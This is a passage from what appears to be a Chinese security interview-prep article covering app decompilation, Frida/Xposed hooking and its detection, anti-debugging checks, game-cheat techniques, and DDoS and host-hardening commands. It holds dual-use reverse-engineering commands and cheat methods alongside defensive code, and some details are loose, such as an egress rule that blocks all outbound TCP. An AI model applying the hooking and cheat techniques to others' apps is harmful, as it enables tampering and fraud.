  - JavaScript 的 <code>setTimeout</code> 方法不会被 <code>location.href</code> 影响，可用于延迟执行代码：<br>     <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;This runs even after page change!&quot;</span>);</span><br><span class="line">&#125;, <span class="number">3000</span>);</span><br><span class="line">location.<span class="property">href</span> = <span class="string">&quot;https://example.com&quot;</span>;</span><br></pre></td></tr></table></figure><br>2. <strong>使用 <code>window.onbeforeunload</code> 监听跳转</strong>：<br>   - 在页面跳转前执行代码：<br>     <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onbeforeunload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Page is leaving...&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Are you sure?&quot;</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><br>3. <strong>Service Worker 方式</strong>：<br>   - 通过 <code>Service Worker</code> 持续运行 JS 逻辑，即使页面跳转：<br>     <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">navigator.<span class="property">serviceWorker</span>.<span class="title function_">register</span>(<span class="string">&#x27;/worker.js&#x27;</span>).<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Service Worker Registered!&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></h2><h3 id="APK-反编译有哪几种路径，代表工具有哪些？"><a href="#APK-反编译有哪几种路径，代表工具有哪些？" class="headerlink" title="APK 反编译有哪几种路径，代表工具有哪些？"></a><strong>APK 反编译有哪几种路径，代表工具有哪些？</strong></h3><p><strong>反编译路径</strong>：</p>
<ol>
<li><p><strong>DEX 反编译（Dalvik Executable）</strong>：</p>
<ul>
<li>将 <code>classes.dex</code> 还原为 Java 代码：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jadx -d output/ app.apk</span><br></pre></td></tr></table></figure></li>
<li><strong>工具</strong>：<code>JADX</code>、<code>dex2jar</code>、<code>Bytecode Viewer</code></li>
</ul>
</li>
<li><p><strong>资源文件提取</strong>：</p>
<ul>
<li>获取 <code>AndroidManifest.xml</code>、<code>res</code> 目录内容：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool d app.apk -o output/</span><br></pre></td></tr></table></figure></li>
<li><strong>工具</strong>：<code>Apktool</code></li>
</ul>
</li>
<li><p><strong>动态调试（Hook 技术）</strong>：</p>
<ul>
<li>通过 <code>Frida</code>、<code>Xposed</code> 在运行时修改应用行为：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -n target_app -e <span class="string">&quot;Java.perform(() =&gt; &#123; console.log(&#x27;Hooked!&#x27;); &#125;)&quot;</span></span><br></pre></td></tr></table></figure></li>
<li><strong>工具</strong>：<code>Frida</code>、<code>Xposed</code></li>
</ul>
</li>
</ol>
<h2 id="防御措施：-开启-ProGuard-进行代码混淆：-使用-Native-C-代码保护关键逻辑，避免-Java-层被轻易反编译。"><a href="#防御措施：-开启-ProGuard-进行代码混淆：-使用-Native-C-代码保护关键逻辑，避免-Java-层被轻易反编译。" class="headerlink" title="防御措施：- 开启 ProGuard 进行代码混淆：  - 使用 Native C++ 代码保护关键逻辑，避免 Java 层被轻易反编译。"></a><strong>防御措施</strong>：<br>- <strong>开启 ProGuard</strong> 进行代码混淆：<br>  <figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">minifyEnabled <span class="keyword">true</span></span><br><span class="line">proguardFiles getDefaultProguardFile(<span class="string">&#x27;proguard-android-optimize.txt&#x27;</span>), <span class="string">&#x27;proguard-rules.pro&#x27;</span></span><br></pre></td></tr></table></figure><br>- <strong>使用 Native C++ 代码保护关键逻辑</strong>，避免 Java 层被轻易反编译。</h2><h3 id="App-自检升级场景下会存在哪些风险？"><a href="#App-自检升级场景下会存在哪些风险？" class="headerlink" title="App 自检升级场景下会存在哪些风险？"></a><strong>App 自检升级场景下会存在哪些风险？</strong></h3><p><strong>主要风险</strong>：</p>
<ol>
<li><strong>中间人攻击（MITM）</strong>：<ul>
<li>升级包下载过程中若未使用 HTTPS，攻击者可篡改文件。</li>
</ul>
</li>
<li><strong>伪造更新包</strong>：<ul>
<li>服务器未进行签名校验，攻击者可伪造更新包，执行恶意代码。</li>
</ul>
</li>
<li><strong>权限提升</strong>：<ul>
<li>更新过程中若涉及动态加载 <code>dex</code> 或 <code>so</code>，可能被滥用实现远程代码执行（RCE）。</li>
</ul>
</li>
<li><strong>更新劫持</strong>：<ul>
<li>低版本系统可能被 <code>app hijacking</code> 攻击，导致跳转到恶意应用下载页面。</li>
</ul>
</li>
</ol>
<h2 id="防护措施：-强制使用-HTTPS-进行更新包传输，防止流量篡改。-签名校验，更新包需进行-SHA256-校验：-完整性检查，校验-AndroidManifest-xml-及-dex，防止动态加载恶意代码。"><a href="#防护措施：-强制使用-HTTPS-进行更新包传输，防止流量篡改。-签名校验，更新包需进行-SHA256-校验：-完整性检查，校验-AndroidManifest-xml-及-dex，防止动态加载恶意代码。" class="headerlink" title="防护措施：- 强制使用 HTTPS 进行更新包传输，防止流量篡改。- 签名校验，更新包需进行 SHA256 校验：  - 完整性检查，校验 AndroidManifest.xml 及 dex，防止动态加载恶意代码。"></a><strong>防护措施</strong>：<br>- <strong>强制使用 HTTPS</strong> 进行更新包传输，防止流量篡改。<br>- <strong>签名校验</strong>，更新包需进行 <strong>SHA256 校验</strong>：<br>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">MessageDigest</span> <span class="variable">md</span> <span class="operator">=</span> MessageDigest.getInstance(<span class="string">&quot;SHA-256&quot;</span>);</span><br><span class="line"><span class="type">byte</span>[] digest = md.digest(fileBytes);</span><br></pre></td></tr></table></figure><br>- <strong>完整性检查</strong>，校验 <code>AndroidManifest.xml</code> 及 <code>dex</code>，防止动态加载恶意代码。</h2><h3 id="如何设计一套通信机制，能够保证传输过程中的完整性、不可抵赖性以及防止重放？"><a href="#如何设计一套通信机制，能够保证传输过程中的完整性、不可抵赖性以及防止重放？" class="headerlink" title="如何设计一套通信机制，能够保证传输过程中的完整性、不可抵赖性以及防止重放？"></a><strong>如何设计一套通信机制，能够保证传输过程中的完整性、不可抵赖性以及防止重放？</strong></h3><h2 id="设计原则：1-完整性：-采用-HMAC-SHA256-签名，确保消息未被篡改：-2-不可抵赖性：-使用-RSA-签名-确保消息来源可信：-3-防止重放攻击：-采用-时间戳-随机数（nonce），确保每次请求唯一：-服务器端存储-nonce，避免相同请求重复提交。"><a href="#设计原则：1-完整性：-采用-HMAC-SHA256-签名，确保消息未被篡改：-2-不可抵赖性：-使用-RSA-签名-确保消息来源可信：-3-防止重放攻击：-采用-时间戳-随机数（nonce），确保每次请求唯一：-服务器端存储-nonce，避免相同请求重复提交。" class="headerlink" title="设计原则：1. 完整性：   - 采用 HMAC-SHA256 签名，确保消息未被篡改：     2. 不可抵赖性：   - 使用 RSA 签名 确保消息来源可信：     3. 防止重放攻击：   - 采用 时间戳 + 随机数（nonce），确保每次请求唯一：        - 服务器端存储 nonce，避免相同请求重复提交。"></a><strong>设计原则</strong>：<br>1. <strong>完整性</strong>：<br>   - 采用 <strong>HMAC-SHA256 签名</strong>，确保消息未被篡改：<br>     <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Mac</span> <span class="variable">mac</span> <span class="operator">=</span> Mac.getInstance(<span class="string">&quot;HmacSHA256&quot;</span>);</span><br><span class="line">mac.init(<span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(secretKey.getBytes(), <span class="string">&quot;HmacSHA256&quot;</span>));</span><br><span class="line"><span class="type">byte</span>[] hash = mac.doFinal(message.getBytes());</span><br></pre></td></tr></table></figure><br>2. <strong>不可抵赖性</strong>：<br>   - 使用 <strong>RSA 签名</strong> 确保消息来源可信：<br>     <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Signature</span> <span class="variable">sign</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;SHA256withRSA&quot;</span>);</span><br><span class="line">sign.initSign(privateKey);</span><br><span class="line">sign.update(message.getBytes());</span><br><span class="line"><span class="type">byte</span>[] signature = sign.sign();</span><br></pre></td></tr></table></figure><br>3. <strong>防止重放攻击</strong>：<br>   - 采用 <strong>时间戳 + 随机数（nonce）</strong>，确保每次请求唯一：<br>     <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span> <span class="number">1700000000</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;nonce&quot;</span><span class="punctuation">:</span> <span class="string">&quot;random-uuid&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;signature&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hmac_signature&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><br>   - 服务器端存储 <code>nonce</code>，避免相同请求重复提交。</h2><h3 id="如何进行实体检测？"><a href="#如何进行实体检测？" class="headerlink" title="如何进行实体检测？"></a><strong>如何进行实体检测？</strong></h3><p><strong>实体检测方法</strong>：</p>
<ol>
<li><strong>基于指纹识别</strong>：<ul>
<li>通过 <strong>设备 ID、MAC 地址、IMEI</strong> 进行唯一性检测。</li>
</ul>
</li>
<li><strong>基于地理位置</strong>：<ul>
<li>结合 GPS、WiFi 位置数据验证实体存在性。</li>
</ul>
</li>
<li><strong>基于行为分析</strong>：<ul>
<li>通过 <strong>鼠标移动轨迹、打字节奏</strong> 识别真实用户 vs 机器人。</li>
</ul>
</li>
</ol>
<h2 id="安全措施：-避免依赖-单一标识符，综合多个数据源进行验证。-采用-生物识别（指纹、人脸）增强认证安全性。"><a href="#安全措施：-避免依赖-单一标识符，综合多个数据源进行验证。-采用-生物识别（指纹、人脸）增强认证安全性。" class="headerlink" title="安全措施：- 避免依赖 单一标识符，综合多个数据源进行验证。- 采用 生物识别（指纹、人脸）增强认证安全性。"></a><strong>安全措施</strong>：<br>- 避免依赖 <strong>单一标识符</strong>，综合多个数据源进行验证。<br>- 采用 <strong>生物识别</strong>（指纹、人脸）增强认证安全性。</h2><h3 id="常见的调试方法和检测方法？"><a href="#常见的调试方法和检测方法？" class="headerlink" title="常见的调试方法和检测方法？"></a><strong>常见的调试方法和检测方法？</strong></h3><p><strong>常见调试方法</strong>：</p>
<ol>
<li><strong>Logcat 调试</strong>：<ul>
<li>通过 <code>adb logcat</code> 查看应用日志。</li>
</ul>
</li>
<li><strong>动态 Hook</strong>：<ul>
<li>通过 <code>Frida</code> 或 <code>Xposed</code> 修改应用逻辑：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -n target_app -e <span class="string">&quot;Java.perform(() =&gt; &#123; console.log(&#x27;Hooked!&#x27;); &#125;)&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>Smali 逆向修改</strong>：<ul>
<li>反编译 <code>apk</code> 并修改 <code>smali</code> 代码：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apktool d app.apk</span><br><span class="line">vim smali/com/example/MainActivity.smali</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<p><strong>调试检测方法</strong>：</p>
<ul>
<li>**检测 <code>TracerPid</code>**：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;/proc/self/status&quot;</span>));</span><br><span class="line">String line;</span><br><span class="line"><span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (line.contains(<span class="string">&quot;TracerPid&quot;</span>) &amp;&amp; !line.endsWith(<span class="string">&quot;\t0&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;Debugging detected!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><strong>检测 <code>ptrace</code> 进程</strong>：<ul>
<li>在 <code>Android</code> 设备上，<code>ptrace</code> 只能被一个进程附加，利用此特性可检测调试。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="如何防止-Frida、Xposed-等注入攻击？"><a href="#如何防止-Frida、Xposed-等注入攻击？" class="headerlink" title="如何防止 Frida、Xposed 等注入攻击？"></a><strong>如何防止 Frida、Xposed 等注入攻击？</strong></h3><h2 id="防御方法：1-检测-Frida-进程：-通过-proc-net-tcp-检测-Frida-监听端口：-2-Xposed-Hook-检测：-检测-XposedBridge-jar-是否存在：-3-SELinux-强制模式：-运行-getenforce-命令，确保-SELinux-处于-Enforcing-模式。"><a href="#防御方法：1-检测-Frida-进程：-通过-proc-net-tcp-检测-Frida-监听端口：-2-Xposed-Hook-检测：-检测-XposedBridge-jar-是否存在：-3-SELinux-强制模式：-运行-getenforce-命令，确保-SELinux-处于-Enforcing-模式。" class="headerlink" title="防御方法：1. 检测 Frida 进程：   - 通过 /proc/net/tcp 检测 Frida 监听端口：     2. Xposed Hook 检测：   - 检测 XposedBridge.jar 是否存在：     3. SELinux 强制模式：   - 运行 getenforce 命令，确保 SELinux 处于 Enforcing 模式。"></a><strong>防御方法</strong>：<br>1. <strong>检测 Frida 进程</strong>：<br>   - 通过 <code>/proc/net/tcp</code> 检测 Frida 监听端口：<br>     <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;netstat -an&quot;</span>);</span><br></pre></td></tr></table></figure><br>2. <strong>Xposed Hook 检测</strong>：<br>   - 检测 <code>XposedBridge.jar</code> 是否存在：<br>     <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">xposed</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/system/framework/XposedBridge.jar&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (xposed.exists()) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;Xposed detected!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>3. <strong>SELinux 强制模式</strong>：<br>   - 运行 <code>getenforce</code> 命令，确保 <code>SELinux</code> 处于 <code>Enforcing</code> 模式。</h2><h3 id="如何防止当前设备的数据拷贝到其他设备？"><a href="#如何防止当前设备的数据拷贝到其他设备？" class="headerlink" title="如何防止当前设备的数据拷贝到其他设备？"></a><strong>如何防止当前设备的数据拷贝到其他设备？</strong></h3><h2 id="防御措施：1-文件权限控制：-Android-限制文件访问：-2-设备绑定机制：-结合-Device-ID-用户-ID-进行数据绑定：-3-阻止-ADB-访问：-监听-adb-连接状态："><a href="#防御措施：1-文件权限控制：-Android-限制文件访问：-2-设备绑定机制：-结合-Device-ID-用户-ID-进行数据绑定：-3-阻止-ADB-访问：-监听-adb-连接状态：" class="headerlink" title="防御措施：1. 文件权限控制：   - Android 限制文件访问：     2. 设备绑定机制：   - 结合 Device ID + 用户 ID 进行数据绑定：     3. 阻止 ADB 访问：   - 监听 adb 连接状态：     "></a><strong>防御措施</strong>：<br>1. <strong>文件权限控制</strong>：<br>   - Android 限制文件访问：<br>     <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(context.getFilesDir(), <span class="string">&quot;data.txt&quot;</span>);</span><br><span class="line">file.setReadable(<span class="literal">false</span>, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><br>2. <strong>设备绑定机制</strong>：<br>   - 结合 <code>Device ID + 用户 ID</code> 进行数据绑定：<br>     <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;device_id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;abcd1234&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;user_id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;user5678&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><br>3. <strong>阻止 ADB 访问</strong>：<br>   - 监听 <code>adb</code> 连接状态：<br>     <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">adbStatus</span> <span class="operator">=</span> Settings.Global.getString(getContentResolver(), Settings.Global.ADB_ENABLED);</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;1&quot;</span>.equals(adbStatus)) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;ADB detected!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></h2><h3 id="外挂有几种类型的实现方式？"><a href="#外挂有几种类型的实现方式？" class="headerlink" title="外挂有几种类型的实现方式？"></a><strong>外挂有几种类型的实现方式？</strong></h3><p><strong>外挂类型</strong>：</p>
<ol>
<li><strong>修改游戏内存</strong>：<ul>
<li>通过 <code>Frida</code> 或 <code>Cheat Engine</code> 修改游戏数据。</li>
</ul>
</li>
<li><strong>注入 DLL</strong>：<ul>
<li>在 <code>Windows</code> 或 <code>Android</code> 上，攻击者可向游戏进程注入动态库 (<code>.dll</code> 或 <code>.so</code>)。</li>
</ul>
</li>
<li><strong>模拟点击</strong>：<ul>
<li>通过 <code>Auto.js</code> 或 <code>ADB</code> 自动化点击：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell input tap 500 500</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>网络封包修改</strong>：<ul>
<li>通过 <code>Burp Suite</code> 截取 HTTP 请求，修改游戏数据包。</li>
</ul>
</li>
</ol>
<h2 id="防御措施：-检测内存修改，启用-Integrity-Check。-使用服务器验证关键数据，避免客户端篡改。"><a href="#防御措施：-检测内存修改，启用-Integrity-Check。-使用服务器验证关键数据，避免客户端篡改。" class="headerlink" title="防御措施：- 检测内存修改，启用 Integrity Check。- 使用服务器验证关键数据，避免客户端篡改。"></a><strong>防御措施</strong>：<br>- <strong>检测内存修改</strong>，启用 <strong>Integrity Check</strong>。<br>- <strong>使用服务器验证关键数据</strong>，避免客户端篡改。</h2><h3 id="如何避免未经用户授权获取权限？"><a href="#如何避免未经用户授权获取权限？" class="headerlink" title="如何避免未经用户授权获取权限？"></a><strong>如何避免未经用户授权获取权限？</strong></h3><p><strong>防御策略</strong>：</p>
<ol>
<li><strong>权限最小化原则</strong>：<ul>
<li>仅申请必要权限，避免用户警觉：<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.CAMERA&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>动态权限申请</strong>：<ul>
<li>运行时请求权限：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ContextCompat.checkSelfPermission(<span class="built_in">this</span>, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) &#123;</span><br><span class="line">    ActivityCompat.requestPermissions(<span class="built_in">this</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;Manifest.permission.READ_CONTACTS&#125;, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>权限使用透明化</strong>：<ul>
<li>在 UI 提示用户权限用途，增强信任感。</li>
</ul>
</li>
</ol>
<h2 id="基础设施安全岗"><a href="#基础设施安全岗" class="headerlink" title="基础设施安全岗"></a>基础设施安全岗</h2><h3 id="DDoS-CC-如何有效防御与应急？"><a href="#DDoS-CC-如何有效防御与应急？" class="headerlink" title="DDoS&#x2F;CC 如何有效防御与应急？"></a><strong>DDoS&#x2F;CC 如何有效防御与应急？</strong></h3><p><strong>防御措施</strong>：</p>
<ol>
<li><p><strong>基础防护</strong>：</p>
<ul>
<li>启用 <strong>WAF（Web 应用防火墙）</strong>，过滤恶意流量。</li>
<li>限制 <strong>同一 IP 访问频率</strong>，防止 CC 攻击：<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">limit_req_zone</span> <span class="variable">$binary_remote_addr</span> zone=one:<span class="number">10m</span> rate=5r/s;</span><br></pre></td></tr></table></figure></li>
<li>启用 <strong>CDN</strong>（如 Cloudflare）缓解攻击。</li>
</ul>
</li>
<li><p><strong>高级防护</strong>：</p>
<ul>
<li>采用 <strong>流量清洗</strong>（如阿里云 DDoS 防护）。</li>
<li>配置 <strong>黑洞路由</strong>，丢弃异常流量。</li>
</ul>
</li>
</ol>
<h2 id="应急方案：-立即封禁攻击-IP：-切换备用服务器，防止业务中断。"><a href="#应急方案：-立即封禁攻击-IP：-切换备用服务器，防止业务中断。" class="headerlink" title="应急方案：- 立即封禁攻击 IP：  - 切换备用服务器，防止业务中断。"></a><strong>应急方案</strong>：<br>- 立即封禁攻击 IP：<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -s &lt;malicious_ip&gt; -j DROP</span><br></pre></td></tr></table></figure><br>- 切换备用服务器，防止业务中断。</h2><h3 id="如何对网络区域进行划分？"><a href="#如何对网络区域进行划分？" class="headerlink" title="如何对网络区域进行划分？"></a><strong>如何对网络区域进行划分？</strong></h3><p><strong>网络分区原则</strong>：</p>
<ol>
<li><p><strong>按照安全等级划分</strong>：</p>
<ul>
<li><strong>DMZ（非军事区）</strong>：对外暴露的服务（如 Web 服务器）。</li>
<li><strong>内部网络（LAN）</strong>：企业内部系统（如数据库、文件服务器）。</li>
<li><strong>隔离区</strong>：存放敏感数据，限制访问权限。</li>
</ul>
</li>
<li><p><strong>VLAN（虚拟局域网）</strong>：</p>
<ul>
<li>使用 <strong>VLAN</strong> 进行逻辑隔离，防止广播风暴。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="经典网络与-VPC-的优势"><a href="#经典网络与-VPC-的优势" class="headerlink" title="经典网络与 VPC 的优势"></a><strong>经典网络与 VPC 的优势</strong></h3><table>
<thead>
<tr>
<th><strong>对比项</strong></th>
<th><strong>经典网络</strong></th>
<th><strong>VPC（Virtual Private Cloud）</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>隔离性</strong></td>
<td>共享网络</td>
<td>独立私有网络</td>
</tr>
<tr>
<td><strong>安全性</strong></td>
<td>较低</td>
<td>更高（可配置子网、ACL、NACL）</td>
</tr>
<tr>
<td><strong>扩展性</strong></td>
<td>受限</td>
<td>可灵活定义子网、路由</td>
</tr>
<tr>
<td><strong>适用场景</strong></td>
<td>传统数据中心</td>
<td>云计算、混合云</td>
</tr>
</tbody></table>
<hr>
<h3 id="主机最重要的基线是什么？"><a href="#主机最重要的基线是什么？" class="headerlink" title="主机最重要的基线是什么？"></a><strong>主机最重要的基线是什么？</strong></h3><h2 id="安全基线：1-最小权限原则：-关闭不必要的服务：-2-日志审计：-启用-auditd-记录关键操作：-3-访问控制：-仅允许特定-IP-登录："><a href="#安全基线：1-最小权限原则：-关闭不必要的服务：-2-日志审计：-启用-auditd-记录关键操作：-3-访问控制：-仅允许特定-IP-登录：" class="headerlink" title="安全基线：1. 最小权限原则：   - 关闭不必要的服务：     2. 日志审计：   - 启用 auditd 记录关键操作：     3. 访问控制：   - 仅允许特定 IP 登录：     "></a><strong>安全基线</strong>：<br>1. <strong>最小权限原则</strong>：<br>   - 关闭不必要的服务：<br>     <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">disable</span> telnet</span><br></pre></td></tr></table></figure><br>2. <strong>日志审计</strong>：<br>   - 启用 <code>auditd</code> 记录关键操作：<br>     <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auditctl -w /etc/passwd -p wa -k passwd_change</span><br></pre></td></tr></table></figure><br>3. <strong>访问控制</strong>：<br>   - 仅允许特定 IP 登录：<br>     <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 22 -s 192.168.1.100 -j ACCEPT</span><br></pre></td></tr></table></figure></h2><h3 id="禁止出网的价值有哪些？"><a href="#禁止出网的价值有哪些？" class="headerlink" title="禁止出网的价值有哪些？"></a><strong>禁止出网的价值有哪些？</strong></h3><p><strong>主要价值</strong>：</p>
<ol>
<li><strong>防止数据泄露</strong>：<ul>
<li>限制服务器主动连接外部 IP，防止数据外泄。</li>
</ul>
</li>
<li><strong>阻止 C2（C&amp;C）通信</strong>：<ul>
<li>防止恶意软件与攻击者服务器建立连接。</li>
</ul>
</li>
</ol>
<h2 id="实施方法：-配置防火墙规则："><a href="#实施方法：-配置防火墙规则：" class="headerlink" title="实施方法：- 配置防火墙规则：  "></a><strong>实施方法</strong>：<br>- 配置防火墙规则：<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A OUTPUT -p tcp -j REJECT</span><br></pre></td></tr></table></figure></h2><h3 id="云原生下的网络和主机差异是什么？会有哪些新的风险？"><a href="#云原生下的网络和主机差异是什么？会有哪些新的风险？" class="headerlink" title="云原生下的网络和主机差异是什么？会有哪些新的风险？"></a><strong>云原生下的网络和主机差异是什么？会有哪些新的风险？</strong></h3><p><strong>主要差异</strong>：</p>
<ul>
<li><strong>传统主机</strong>：依赖固定 IP，基于 <strong>防火墙</strong> 保护。</li>
<li><strong>云原生</strong>：基于 <strong>容器网络（CNI）</strong>，采用 <strong>微服务架构</strong>。</li>
</ul>
<h2 id="新风险：1-动态-IP-变化：-传统-ACL-规则难以适配。2-横向攻击风险：-容器网络隔离不足，攻击者可在同一集群内横向移动。"><a href="#新风险：1-动态-IP-变化：-传统-ACL-规则难以适配。2-横向攻击风险：-容器网络隔离不足，攻击者可在同一集群内横向移动。" class="headerlink" title="新风险：1. 动态 IP 变化：   - 传统 ACL 规则难以适配。2. 横向攻击风险：   - 容器网络隔离不足，攻击者可在同一集群内横向移动。"></a><strong>新风险</strong>：<br>1. <strong>动态 IP 变化</strong>：<br>   - 传统 ACL 规则难以适配。<br>2. <strong>横向攻击风险</strong>：<br>   - 容器网络隔离不足，攻击者可在同一集群内横向移动。</h2><h3 id="如何实现反向-HTTPS-代理？"><a href="#如何实现反向-HTTPS-代理？" class="headerlink" title="如何实现反向 HTTPS 代理？"></a><strong>如何实现反向 HTTPS 代理？</strong></h3><h2 id="Nginx-配置反向代理："><a href="#Nginx-配置反向代理：" class="headerlink" title="Nginx 配置反向代理："></a><strong>Nginx 配置反向代理</strong>：<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 